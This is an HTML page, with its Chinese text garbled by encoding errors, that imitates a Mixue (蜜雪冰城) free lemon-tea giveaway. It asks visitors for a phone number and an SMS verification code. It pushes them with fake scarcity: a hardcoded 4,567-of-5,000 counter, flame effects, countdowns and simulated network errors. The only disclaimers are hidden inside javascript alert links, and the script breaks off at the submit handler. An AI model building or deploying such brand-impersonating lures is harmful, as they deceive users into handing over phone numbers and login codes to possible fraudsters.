<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>èœœé›ªå†°åŸ Â· é™æ—¶ç¦åˆ© Â· å…è´¹é¢†å†°æ·‡æ·‹/æŸ æª¬èŒ¶</title>
  <style>
    :root {
      --mixue-red: #E63946;
      --mixue-yellow: #FFD166;
      --mixue-white: #F8F9FA;
      --mixue-dark: #252422;
      --mixue-gray: #CCC5B9;
      --shadow-light: 0 8px 32px rgba(230, 57, 70, 0.25);
      --radius-lg: 28px;
      --radius-md: 18px;
      --radius-sm: 12px;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
      background: linear-gradient(135deg, #ffeff0 0%, #fff9e6 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 15px;
      position: relative;
      overflow-x: hidden;
    }

    /* é›ªæ™¯èƒŒæ™¯ */
    .snow-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -1;
      overflow: hidden;
    }
    .snowflake {
      position: absolute;
      background: white;
      border-radius: 50%;
      opacity: 0.8;
      animation: snowfall linear infinite;
    }
    @keyframes snowfall {
      0% {
        transform: translateY(-10px) translateX(0);
        opacity: 0;
      }
      10% {
        opacity: 1;
      }
      90% {
        opacity: 1;
      }
      100% {
        transform: translateY(100vh) translateX(20px);
        opacity: 0;
      }
    }

    /* é›ªç‹çˆ¬é›ªå±±å®¹å™¨ */
    .snow-mountain-container {
      width: 100%;
      max-width: 420px;
      height: 120px;
      background: linear-gradient(to bottom, #87CEEB, #E0F7FF);
      border-radius: 20px 20px 0 0;
      position: relative;
      overflow: hidden;
      margin-bottom: -5px;
      border: 3px solid white;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    }

    /* é›ªå±± */
    .mountain {
      position: absolute;
      bottom: 0;
      width: 0;
      height: 0;
      border-left: 100px solid transparent;
      border-right: 100px solid transparent;
      border-bottom: 150px solid white;
      left: 50%;
      transform: translateX(-50%);
      filter: drop-shadow(0 5px 10px rgba(0,0,0,0.1));
    }
    .mountain:before {
      content: '';
      position: absolute;
      top: 30px;
      left: -80px;
      width: 160px;
      height: 60px;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);
      transform: rotate(-30deg);
    }

    /* é›ªç‹åŠ¨ç”» */
    .snow-king {
      position: absolute;
      bottom: 10px;
      left: 10%;
      width: 60px;
      height: 80px;
      transform-origin: bottom center;
      transition: left 0.3s ease;
      z-index: 10;
    }

    /* é›ªç‹èº«ä½“ */
    .snow-king-body {
      position: relative;
      width: 50px;
      height: 50px;
      background: white;
      border-radius: 50%;
      margin: 0 auto;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    }

    /* é›ªç‹å¸½å­ */
    .snow-king-crown {
      position: absolute;
      top: -20px;
      left: 50%;
      transform: translateX(-50%);
      width: 40px;
      height: 25px;
      background: #E63946;
      border-radius: 50% 50% 0 0;
    }
    .snow-king-crown:before {
      content: 'ğŸ‘‘';
      position: absolute;
      top: 5px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 12px;
    }

    /* é›ªç‹çœ¼ç› */
    .snow-king-eye {
      position: absolute;
      top: 15px;
      width: 8px;
      height: 8px;
      background: #333;
      border-radius: 50%;
    }
    .snow-king-eye.left { left: 15px; }
    .snow-king-eye.right { right: 15px; }

    /* é›ªç‹å˜´å·´ */
    .snow-king-mouth {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      width: 20px;
      height: 10px;
      border-bottom: 3px solid #333;
      border-radius: 0 0 10px 10px;
    }

    /* ç™»å±±æ– */
    .snow-king-stick {
      position: absolute;
      bottom: 0;
      right: -10px;
      width: 4px;
      height: 60px;
      background: #8B4513;
      transform: rotate(-10deg);
      transform-origin: bottom;
      animation: climbStick 1s infinite alternate;
    }
    @keyframes climbStick {
      0% { transform: rotate(-10deg); }
      100% { transform: rotate(-5deg); }
    }

    /* è¿›åº¦æ¡å®¹å™¨ */
    .progress-section {
      width: 100%;
      max-width: 420px;
      padding: 20px;
      background: white;
      border-radius: 0 0 20px 20px;
      margin-top: -5px;
      position: relative;
    }

    /* è¿›åº¦æ¡ */
    .progress-container {
      width: 100%;
      height: 30px;
      background: linear-gradient(to right, #f0f0f0, #e0e0e0);
      border-radius: 15px;
      overflow: hidden;
      position: relative;
      margin-bottom: 10px;
      border: 2px solid #ddd;
    }

    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #4CAF50, #8BC34A, #CDDC39);
      border-radius: 15px;
      width: 91.34%; /* 4567/5000 */
      position: relative;
      transition: width 1s ease;
    }

    /* ç«ç„°ç‰¹æ•ˆ */
    .fire-effect {
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      width: 40px;
      height: 40px;
      filter: blur(2px);
      opacity: 0.8;
      z-index: 2;
    }

    .flame {
      position: absolute;
      bottom: 0;
      width: 15px;
      height: 25px;
      background: linear-gradient(to top, #FF5722, #FF9800, #FFC107);
      border-radius: 50% 50% 20% 20%;
      animation: flicker 0.5s infinite alternate;
    }

    .flame:nth-child(1) {
      left: 5px;
      animation-delay: 0s;
    }
    .flame:nth-child(2) {
      left: 15px;
      height: 30px;
      animation-delay: 0.2s;
    }
    .flame:nth-child(3) {
      left: 25px;
      height: 20px;
      animation-delay: 0.1s;
    }

    @keyframes flicker {
      0% {
        transform: scaleY(1) translateY(0);
        opacity: 0.8;
      }
      100% {
        transform: scaleY(1.2) translateY(-5px);
        opacity: 1;
      }
    }

    /* è¿›åº¦æ–‡æœ¬ */
    .progress-text {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 5px;
    }

    .progress-count {
      font-size: 1.2rem;
      font-weight: bold;
      color: var(--mixue-red);
      background: rgba(255,209,102,0.15);
      padding: 8px 16px;
      border-radius: 20px;
      animation: pulse 2.5s infinite;
    }

    .progress-stats {
      font-size: 0.9rem;
      color: #666;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--radius-lg);
      overflow: hidden;
      box-shadow: var(--shadow-light);
      border: 1px solid rgba(230,57,70,0.1);
      animation: fadeUp 0.6s ease-out;
      backdrop-filter: blur(10px);
    }
    @keyframes fadeUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .header {
      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
      color: var(--mixue-white);
      padding: 42px 28px 24px;
      text-align: center;
      position: relative;
    }
    .header::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 6px;
      background: var(--mixue-yellow);
    }
    .header h1 {
      font-size: 2.6rem;
      font-weight: 900;
      letter-spacing: 2px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .header p {
      margin: 10px 0 16px;
      font-size: 1.15rem;
      font-weight: 500;
      opacity: 0.95;
    }

    .activity-period {
      font-size: 0.9rem;
      background: rgba(255,255,255,0.15);
      padding: 10px 20px;
      border-radius: 50px;
      display: inline-block;
      margin: 8px 0 16px;
    }
    #globalTimer {
      color: var(--mixue-yellow);
      font-weight: 700;
    }

    .content {
      padding: 32px 28px 40px;
      background: var(--mixue-white);
    }

    .barrage-box {
      height: 80px;
      margin: 0 0 20px;
      background: rgba(230,57,70,0.05);
      border-radius: var(--radius-sm);
      overflow: hidden;
      position: relative;
      border: 1px solid rgba(230,57,70,0.1);
    }
    
    .barrage-item {
      position: absolute;
      white-space: nowrap;
      font-size: 0.9rem;
      font-weight: 600;
      color: var(--mixue-red);
      padding: 6px 16px;
      line-height: 20px;
      left: 100%;
      background: rgba(255,255,255,0.9);
      border-radius: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      animation: barrageSlide 8s linear forwards;
      z-index: 1;
    }
    
    @keyframes barrageSlide {
      0% { left: 100%; }
      100% { left: -100%; }
    }

    .fair-tip {
      text-align: center;
      font-size: 0.85rem;
      color: var(--mixue-red);
      margin: 12px 0;
      font-weight: 600;
      line-height: 1.4;
    }

    .input-box {
      position: relative;
      margin-bottom: 20px;
      z-index: 1;
    }
    
    input {
      width: 100%;
      height: 56px;
      padding: 0 24px;
      border: 2px solid var(--mixue-gray);
      border-radius: var(--radius-md);
      font-size: 1rem;
      background: #fff;
      transition: all 0.3s ease;
      position: relative;
      z-index: 2;
      -webkit-appearance: none;
      appearance: none;
      opacity: 1;
      pointer-events: auto;
    }
    
    input::placeholder {
      color: #aaa;
    }
    
    input:focus {
      outline: none;
      border-color: var(--mixue-red);
      box-shadow: 0 0 0 6px rgba(230,57,70,0.1);
      transform: translateY(-2px);
    }
    
    input.input-error {
      border-color: #ff4d4f;
      box-shadow: 0 0 0 6px rgba(255,77,79,0.1);
      animation: shake 0.3s ease-in-out;
    }
    
    @keyframes shake {
      0%,100% { transform: translateX(0); }
      25% { transform: translateX(-4px); }
      75% { transform: translateX(4px); }
    }
    
    .placeholder {
      position: absolute;
      left: 24px;
      top: 50%;
      transform: translateY(-50%);
      color: #888;
      font-size: 1rem;
      pointer-events: none;
      transition: all 0.3s ease;
      background: #fff;
      padding: 0 6px;
      z-index: 3;
      white-space: nowrap;
    }
    
    input:focus + .placeholder,
    input:not(:placeholder-shown) + .placeholder {
      top: -10px;
      left: 20px;
      font-size: 0.8rem;
      color: var(--mixue-red);
      font-weight: 600;
    }

    /* éªŒè¯çŠ¶æ€å›¾æ ‡ */
    .input-status {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      width: 24px;
      height: 24px;
      z-index: 10;
      opacity: 0;
      transition: opacity 0.3s;
    }

    .input-status.valid {
      opacity: 1;
      color: #4CAF50;
    }

    .input-status.invalid {
      opacity: 1;
      color: #ff4d4f;
    }

    .verify-slider {
      width: 100%;
      height: 46px;
      background: #f7f8fa;
      border-radius: 23px;
      position: relative;
      margin: 20px 0;
      overflow: hidden;
      border: 1px solid #e5e6eb;
      display: none;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.4s ease;
    }
    .verify-slider.show {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }
    .verify-bg {
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      background: linear-gradient(90deg, var(--mixue-yellow), #ffbd59);
      width: 0;
      transition: width 0.2s ease;
      border-radius: 23px 0 0 23px;
    }
    .verify-block {
      position: absolute;
      left: 0;
      top: 0;
      width: 46px;
      height: 46px;
      background: linear-gradient(135deg, var(--mixue-red), #d62e3d);
      border-radius: 50%;
      cursor: grab;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 20px;
      font-weight: bold;
      transition: left 0.2s ease, transform 0.2s ease;
      z-index: 2;
      user-select: none;
      -webkit-user-select: none;
      box-shadow: 0 2px 8px rgba(230,57,70,0.3);
    }
    .verify-block:active {
      cursor: grabbing;
      transform: scale(1.1);
    }
    .verify-text {
      position: absolute;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #666;
      font-size: 0.95rem;
      font-weight: 500;
      z-index: 1;
      user-select: none;
    }
    .verify-success .verify-bg {
      background: linear-gradient(90deg, #52c41a, #73d13d);
      border-radius: 23px;
    }
    .verify-success .verify-block {
      background: linear-gradient(135deg, #52c41a, #73d13d);
      box-shadow: 0 2px 8px rgba(82, 196, 26, 0.3);
    }

    .btn {
      width: 100%;
      height: 60px;
      background: linear-gradient(135deg, var(--mixue-red), #D62E3D);
      color: #fff;
      border: none;
      border-radius: var(--radius-md);
      font-size: 1.25rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: 16px;
      position: relative;
      overflow: hidden;
      box-shadow: 0 6px 16px rgba(230,57,70,0.3);
      z-index: 1;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(230,57,70,0.4);
    }
    .btn:disabled {
      background: var(--mixue-gray);
      cursor: not-allowed;
      box-shadow: none;
      transform: none;
    }
    .btn:active {
      transform: scale(0.97);
    }
    .btn::after {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      background: rgba(255,255,255,0.3);
      border-radius: 50%;
      transform: translate(-50%,-50%);
      transition: width 0.6s, height 0.6s;
    }
    .btn:active::after {
      width: 500px;
      height: 500px;
    }

    /* Loading æŒ‰é’®çŠ¶æ€ */
    .btn.loading {
      color: transparent;
      pointer-events: none;
    }

    .btn.loading::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    #countdown {
      opacity: 0;
      color: var(--mixue-red);
      text-align: center;
      margin-top: 14px;
      font-size: 0.95rem;
      font-weight: 500;
    }

    .agreement {
      margin-top: 28px;
      font-size: 0.85rem;
      color: #666;
      text-align: center;
      line-height: 1.5;
    }
    .agreement a {
      color: var(--mixue-red);
      font-weight: 600;
      text-decoration: none;
    }

    /* é”™è¯¯é¡µé¢ */
    .error-page {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, #87CEEB, #E0F7FF);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 10000;
      padding: 20px;
    }

    .error-content {
      text-align: center;
      background: white;
      padding: 40px;
      border-radius: 30px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.2);
      max-width: 400px;
      animation: bounceIn 0.8s cubic-bezier(0.175,0.885,0.32,1.2);
    }

    .snow-king-frozen {
      font-size: 120px;
      margin-bottom: 20px;
      animation: shiver 2s infinite;
    }

    @keyframes shiver {
      0%, 100% { transform: rotate(0deg); }
      25% { transform: rotate(5deg); }
      75% { transform: rotate(-5deg); }
    }

    .error-message {
      font-size: 1.5rem;
      color: #333;
      margin: 20px 0;
      font-weight: bold;
    }

    .error-btn {
      background: var(--mixue-red);
      color: white;
      border: none;
      padding: 15px 40px;
      border-radius: 25px;
      font-size: 1.1rem;
      cursor: pointer;
      margin-top: 20px;
      transition: all 0.3s;
    }

    .error-btn:hover {
      transform: scale(1.05);
      box-shadow: 0 5px 15px rgba(230,57,70,0.3);
    }

    /* Confetti æ’’èŠ±æ•ˆæœ */
    .confetti-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 9999;
      display: none;
    }

    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      animation: confettiFall 3s linear forwards;
    }

    @keyframes confettiFall {
      0% {
        transform: translateY(-100px) rotate(0deg);
        opacity: 1;
      }
      100% {
        transform: translateY(100vh) rotate(720deg);
        opacity: 0;
      }
    }

    /* åŠ è½½åŠ¨ç”»å®¹å™¨ */
    .loading-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255,255,255,0.9);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9998;
    }

    .loading-container.show {
      display: flex;
    }

    .loading-text {
      margin-top: 20px;
      font-size: 1.2rem;
      color: var(--mixue-red);
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>

<!-- é›ªæ™¯èƒŒæ™¯ -->
<div class="snow-background" id="snowBackground"></div>

<!-- é›ªç‹çˆ¬é›ªå±±è¿›åº¦å¯è§†åŒ– -->
<div class="snow-mountain-container">
  <div class="mountain"></div>
  <div class="snow-king" id="snowKing">
    <div class="snow-king-crown"></div>
    <div class="snow-king-body">
      <div class="snow-king-eye left"></div>
      <div class="snow-king-eye right"></div>
      <div class="snow-king-mouth"></div>
    </div>
    <div class="snow-king-stick"></div>
  </div>
</div>

<!-- è¿›åº¦æ¡å’Œç«ç„°ç‰¹æ•ˆ -->
<div class="progress-section">
  <div class="progress-container">
    <div class="progress-bar" id="progressBar">
      <div class="fire-effect" id="fireEffect">
        <div class="flame"></div>
        <div class="flame"></div>
        <div class="flame"></div>
      </div>
    </div>
  </div>
  <div class="progress-text">
    <div class="progress-count" id="progressCount">å·²é¢†4,567å¼ </div>
    <div class="progress-stats">å…±5,000å¼  | å‰©ä½™ <span id="remainingCount">433</span> å¼ </div>
  </div>
</div>

<div class="card">
  <div class="header">
    <h1>èœœé›ªå†°åŸ</h1>
    <p>æ˜¥èŠ‚ç‹‚æ¬¢ Â· å…è´¹é¢†å¤§æ¯æŸ æª¬èŒ¶</p>
    <div class="activity-period">
      æ´»åŠ¨è¿›è¡Œä¸­ï¼š2026å¹´1æœˆ30æ—¥ â€” 2026å¹´2æœˆ18æ—¥<br>
      <strong id="globalTimer">æœ¬è½®åé¢å€’è®¡æ—¶ï¼šè®¡ç®—ä¸­...</strong>
    </div>
  </div>

  <div class="content">
    <div class="barrage-box" id="barrageBox"></div>

    <div class="fair-tip">ä¸ºäº†æ´»åŠ¨å…¬å¹³ï¼Œç¦æ­¢ä½¿ç”¨å¤–æŒ‚æ“ä½œï¼Œè¿è§„å°†å–æ¶ˆé¢†å–èµ„æ ¼</div>

    <div class="input-box">
      <input type="text" id="nickname" placeholder="ä½ çš„æ˜µç§°ï¼ˆé€‰å¡«ï¼Œå±•ç¤ºç”¨ï¼‰" maxlength="20" autocomplete="off" />
      <div class="input-status valid" id="nicknameStatus">âœ“</div>
    </div>

    <div class="input-box">
      <input type="tel" id="phone" placeholder="è¯·è¾“å…¥æ‰‹æœºå·" maxlength="11" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
      <div class="input-status invalid" id="phoneStatus">âœ—</div>
    </div>

    <div class="verify-slider" id="verifySlider">
      <div class="verify-bg" id="verifyBg"></div>
      <div class="verify-block" id="verifyBlock">â†’</div>
      <div class="verify-text">æ»‘åŠ¨å®ŒæˆéªŒè¯</div>
    </div>

    <div class="input-box">
      <input type="text" id="code" placeholder="è¯·è¾“å…¥éªŒè¯ç " maxlength="6" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
      <div class="input-status valid" id="codeStatus">âœ“</div>
    </div>

    <button class="btn" id="getCodeBtn" disabled>è·å–éªŒè¯ç </button>
    <button class="btn" id="submitBtn" style="display:none;">ç«‹å³é¢†å–</button>

    <div class="countdown" id="countdown">éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶ï¼ˆ60sï¼‰</div>

    <div class="agreement">
      ç™»å½•å³ä»£è¡¨åŒæ„ã€Š<a href="javascript:alert('æœ¬æ´»åŠ¨ä¸ºæ¼”ç¤ºç‰ˆæœ¬ï¼Œéå®˜æ–¹æ­£å¼æ´»åŠ¨');">ç”¨æˆ·åè®®</a>ã€‹å’Œã€Š<a href="javascript:alert('ä»…ç”¨äºå­¦ä¹ æ¼”ç¤ºï¼Œä¿¡æ¯ä¸ä¼šç”¨äºå•†ä¸šç”¨é€”');">éšç§æ”¿ç­–</a>ã€‹
    </div>
  </div>
</div>

<!-- é”™è¯¯é¡µé¢ -->
<div class="error-page" id="errorPage">
  <div class="error-content">
    <div class="snow-king-frozen">â˜ƒï¸</div>
    <div class="error-message">ç½‘ç»œå¥½åƒè¢«å†»ä½äº†...</div>
    <p style="color: #666; margin: 10px 0;">é›ªç‹æ­£åœ¨åŠªåŠ›è§£å†»ç½‘ç»œï¼Œè¯·ç¨åå†è¯•</p>
    <button class="error-btn" onclick="retryConnection()">å†è¯•ä¸€æ¬¡</button>
  </div>
</div>

<!-- Confetti æ’’èŠ±å®¹å™¨ -->
<div class="confetti-container" id="confettiContainer"></div>

<!-- åŠ è½½åŠ¨ç”» -->
<div class="loading-container" id="loadingContainer">
  <div class="snow-king" style="position: relative; left: 0; bottom: 0;">
    <div class="snow-king-crown"></div>
    <div class="snow-king-body">
      <div class="snow-king-eye left"></div>
      <div class="snow-king-eye right"></div>
      <div class="snow-king-mouth"></div>
    </div>
  </div>
  <div class="loading-text" id="loadingText">é›ªç‹æ­£åœ¨çˆ¬é›ªå±±ä¸­...</div>
</div>

<script>
// åˆå§‹åŒ–å˜é‡
const TOTAL_STOCK = 5000;
let claimed = 4567;
let remaining = TOTAL_STOCK - claimed;
let isVerifySuccess = false;

// DOM å…ƒç´ 
const phoneEl = document.getElementById('phone');
const nicknameEl = document.getElementById('nickname');
const codeEl = document.getElementById('code');
const getBtn = document.getElementById('getCodeBtn');
const submitBtn = document.getElementById('submitBtn');
const cdEl = document.getElementById('countdown');
const progressBar = document.getElementById('progressBar');
const progressCount = document.getElementById('progressCount');
const remainingCount = document.getElementById('remainingCount');
const snowKing = document.getElementById('snowKing');
const fireEffect = document.getElementById('fireEffect');
const errorPage = document.getElementById('errorPage');
const confettiContainer = document.getElementById('confettiContainer');
const loadingContainer = document.getElementById('loadingContainer');
const loadingText = document.getElementById('loadingText');

// åˆ›å»ºé›ªæ™¯
function createSnow() {
  const snowBg = document.getElementById('snowBackground');
  for (let i = 0; i < 50; i++) {
    const snowflake = document.createElement('div');
    snowflake.className = 'snowflake';
    snowflake.style.width = Math.random() * 5 + 2 + 'px';
    snowflake.style.height = snowflake.style.width;
    snowflake.style.left = Math.random() * 100 + 'vw';
    snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
    snowflake.style.animationDelay = Math.random() * 5 + 's';
    snowBg.appendChild(snowflake);
  }
}

// æ›´æ–°è¿›åº¦æ˜¾ç¤º
function updateProgress() {
  const progress = (claimed / TOTAL_STOCK) * 100;
  progressBar.style.width = `${progress}%`;
  progressCount.textContent = `å·²é¢†${claimed.toLocaleString()}å¼ `;
  remainingCount.textContent = remaining.toLocaleString();
  
  // æ›´æ–°é›ªç‹ä½ç½®
  const snowKingPos = 10 + (progress * 0.8);
  snowKing.style.left = `${snowKingPos}%`;
  
  // æ›´æ–°ç«ç„°æ•ˆæœå¼ºåº¦ï¼ˆå‰©ä½™è¶Šå°‘ç«ç„°è¶Šæ—ºï¼‰
  const flameIntensity = 1 + (remaining / TOTAL_STOCK) * 3;
  document.querySelectorAll('.flame').forEach((flame, index) => {
    flame.style.height = `${15 + flameIntensity * 10}px`;
    flame.style.animationDuration = `${0.3 / flameIntensity}s`;
  });
}

// æ˜¾ç¤ºç½‘ç»œé”™è¯¯
function showNetworkError() {
  errorPage.style.display = 'flex';
  
  // æ¨¡æ‹Ÿç½‘ç»œæ¢å¤
  setTimeout(() => {
    hideNetworkError();
  }, 3000 + Math.random() * 2000);
}

function hideNetworkError() {
  errorPage.style.display = 'none';
  showToast('ç½‘ç»œå·²æ¢å¤ï¼Œå¯ä»¥ç»§ç»­æ“ä½œ');
}

function retryConnection() {
  hideNetworkError();
  showLoading('æ­£åœ¨é‡æ–°è¿æ¥...');
  setTimeout(() => {
    hideLoading();
    showToast('è¿æ¥æˆåŠŸï¼');
  }, 1500);
}

// æ˜¾ç¤ºåŠ è½½åŠ¨ç”»
function showLoading(text = 'é›ªç‹æ­£åœ¨çˆ¬é›ªå±±ä¸­...') {
  loadingText.textContent = text;
  loadingContainer.style.display = 'flex';
  loadingContainer.classList.add('show');
}

function hideLoading() {
  loadingContainer.classList.remove('show');
  setTimeout(() => {
    loadingContainer.style.display = 'none';
  }, 300);
}

// æ’’èŠ±åŠ¨ç”»
function createConfetti() {
  confettiContainer.style.display = 'block';
  confettiContainer.innerHTML = '';
  
  const colors = ['#E63946', '#FFD166', '#4CAF50', '#2196F3', '#9C27B0'];
  
  for (let i = 0; i < 150; i++) {
    const confetti = document.createElement('div');
    confetti.className = 'confetti';
    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    confetti.style.left = Math.random() * 100 + 'vw';
    confetti.style.animationDelay = Math.random() * 2 + 's';
    confettiContainer.appendChild(confetti);
  }
  
  setTimeout(() => {
    confettiContainer.style.display = 'none';
  }, 3000);
}

// éªŒè¯æ‰‹æœºå·
function checkPhoneValid() {
  const phoneVal = phoneEl.value.trim();
  const phoneValid = /^1[3-9]\d{9}$/.test(phoneVal);
  const phoneStatus = document.getElementById('phoneStatus');
  
  if (phoneVal.length > 0) {
    if (phoneValid) {
      phoneEl.classList.remove('input-error');
      phoneStatus.className = 'input-status valid';
      phoneStatus.textContent = 'âœ“';
      
      // æ˜¾ç¤ºæ»‘å—éªŒè¯
      verifySlider.classList.add('show');
      if (!document.getElementById('verifyBlock').dataset.inited) {
        initSliderVerify();
      }
    } else {
      phoneEl.classList.add('input-error');
      phoneStatus.className = 'input-status invalid';
      phoneStatus.textContent = 'âœ—';
      verifySlider.classList.remove('show');
      isVerifySuccess = false;
      resetSlider();
    }
  } else {
    phoneEl.classList.remove('input-error');
    phoneStatus.className = 'input-status';
    verifySlider.classList.remove('show');
  }
  
  getBtn.disabled = !phoneValid || !isVerifySuccess;
}

// æ»‘å—éªŒè¯åˆå§‹åŒ–
function initSliderVerify() {
  const verifyBlock = document.getElementById('verifyBlock');
  const verifyBg = document.getElementById('verifyBg');
  
  verifyBlock.dataset.inited = 'true';
  let isDragging = false;
  const sliderWidth = verifySlider.offsetWidth;
  const blockWidth = verifyBlock.offsetWidth;
  const maxLeft = sliderWidth - blockWidth;

  verifyBlock.addEventListener('mousedown', startDrag);
  verifyBlock.addEventListener('touchstart', (e) => {
    e.preventDefault();
    startDrag(e.touches[0]);
  }, { passive: false });

  function startDrag(e) {
    if (isVerifySuccess) return;
    isDragging = true;
    const startX = e.clientX;
    const startLeft = 0;

    document.addEventListener('mousemove', dragMove);
    document.addEventListener('touchmove', (e) => {
      e.preventDefault();
      dragMove(e.touches[0]);
    }, { passive: false });

    document.addEventListener('mouseup', dragEnd);
    document.addEventListener('touchend', (e) => {
      dragEnd(e.changedTouches[0]);
    });

    function dragMove(e) {
      if (!isDragging) return;
      const moveX = e.clientX - startX;
      let left = Math.max(0, Math.min(startLeft + moveX, maxLeft));
      verifyBlock.style.left = left + 'px';
      verifyBg.style.width = left + 'px';
    }

    function dragEnd(e) {
      if (!isDragging) return;
      isDragging = false;
      const finalLeft = parseInt(verifyBlock.style.left) || 0;
      if (finalLeft >= maxLeft * 0.9) {
        verifySuccess();
      } else {
        resetSlider();
      }
      document.removeEventListener('mousemove', dragMove);
      document.removeEventListener('touchmove', dragMove);
      document.removeEventListener('mouseup', dragEnd);
      document.removeEventListener('touchend', dragEnd);
    }
  }

  function verifySuccess() {
    isVerifySuccess = true;
    verifySlider.classList.add('verify-success');
    verifyBlock.textContent = 'âœ“';
    verifyBlock.style.left = maxLeft + 'px';
    verifyBg.style.width = maxLeft + 'px';
    checkPhoneValid();
  }
}

function resetSlider() {
  verifySlider.classList.remove('verify-success');
  const verifyBlock = document.getElementById('verifyBlock');
  const verifyBg = document.getElementById('verifyBg');
  verifyBlock.style.left = '0px';
  verifyBg.style.width = '0px';
  verifyBlock.textContent = 'â†’';
}

// è¾“å…¥éªŒè¯
phoneEl.addEventListener('input', () => {
  checkPhoneValid();
});

phoneEl.addEventListener('blur', () => {
  checkPhoneValid();
});

nicknameEl.addEventListener('input', () => {
  const nicknameStatus = document.getElementById('nicknameStatus');
  if (nicknameEl.value.trim().length > 0) {
    nicknameStatus.className = 'input-status valid';
    nicknameStatus.textContent = 'âœ“';
  } else {
    nicknameStatus.className = 'input-status';
  }
});

codeEl.addEventListener('input', () => {
  const val = codeEl.value.trim();
  const codeStatus = document.getElementById('codeStatus');
  
  submitBtn.style.display = val.length >= 4 ? 'block' : 'none';
  
  if (val.length > 0) {
    if (val.length >= 4) {
      codeEl.classList.remove('input-error');
      codeStatus.className = 'input-status valid';
      codeStatus.textContent = 'âœ“';
      submitBtn.disabled = false;
    } else {
      codeEl.classList.add('input-error');
      codeStatus.className = 'input-status invalid';
      codeStatus.textContent = 'âœ—';
      submitBtn.disabled = true;
    }
  } else {
    codeEl.classList.remove('input-error');
    codeStatus.className = 'input-status';
  }
});

// è·å–éªŒè¯ç 
getBtn.addEventListener('click', async () => {
  if (getBtn.disabled || !isVerifySuccess) return;
  
  showLoading('å‘é€éªŒè¯ç ä¸­...');
  
  // æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ
  setTimeout(() => {
    hideLoading();
    
    const phone = phoneEl.value.trim();
    const nickname = nicknameEl.value.trim() || 'æœªå¡«';
    
    // è®°å½•å‘é€
    console.log(`éªŒè¯ç å‘é€ç»™: ${phone}, æ˜µç§°: ${nickname}`);
    
    // æ¨¡æ‹Ÿå‘é€æˆåŠŸ
    let sec = 60;
    getBtn.disabled = true;
    getBtn.classList.add('loading');
    codeEl.disabled = false;
    codeEl.focus();
    cdEl.style.opacity = '1';
    cdEl.textContent = `éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶ï¼ˆ${sec}sï¼‰`;

    const codeCd = setInterval(() => {
      sec--;
      cdEl.textContent = `éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶ï¼ˆ${sec}sï¼‰`;
      if (sec <= 0) {
        clearInterval(codeCd);
        checkPhoneValid();
        getBtn.classList.remove('loading');
        getBtn.textContent = 'è·å–éªŒè¯ç ';
        cdEl.style.opacity = '0';
      }
    }, 1000);
    
    showToast('éªŒè¯ç å·²å‘é€ï¼Œè¯·æ³¨æ„æŸ¥æ”¶æ‰‹æœºçŸ­ä¿¡');
  }, 1500);
});

// æäº¤é¢†å–
submitBtn.addEventListener('click', async () => {
